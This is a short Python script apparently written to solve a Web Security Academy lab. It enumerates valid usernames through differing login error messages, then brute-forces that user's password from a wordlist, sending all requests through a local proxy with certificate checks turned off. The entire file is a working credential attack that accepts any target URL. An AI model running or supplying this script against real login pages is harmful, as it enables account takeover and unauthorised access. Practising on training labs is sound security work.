#!/usr/bin/env python3

#Author: Mohd Badrudduja
#Module: Authentication Vulnerability (Web Security Academy)
#Title: Username Enumeration via different responses

import requests
import sys
import urllib3

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.session()

def enum_user(url):
    with open('/root/Desktop/test/users.txt', 'r') as outfile:
        usernames = outfile.read().split('\n')
    for user in usernames:
        data = {'username': user, 'password': '123456'}
        r = session.post(url=url, data=data, verify=False, proxies=proxies, allow_redirects=True)
        res = r.text
        if "Invalid" not in res:
            print("[+] Valid username is: " + user)
            break
    return user

def get_password(url):
    user = enum_user(url)
    with open('/root/Desktop/test/passwords.txt', 'r') as outfile:
        passwd = outfile.read().split('\n')
    for p in passwd:
        data = {'username': user, 'password': p}
        r = session.post(url=url, data=data, verify=False, proxies=proxies, allow_redirects=True)
        res = r.text
        if "Incorrect" not in res:
            print("[+] Correct password is: " + p)
            break
			
def main():
    if len(sys.argv) != 2: 
        print("[+] Example: %s www.test.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Enumerating username....")
    get_password(url)
		
if __name__ == '__main__':
    main()
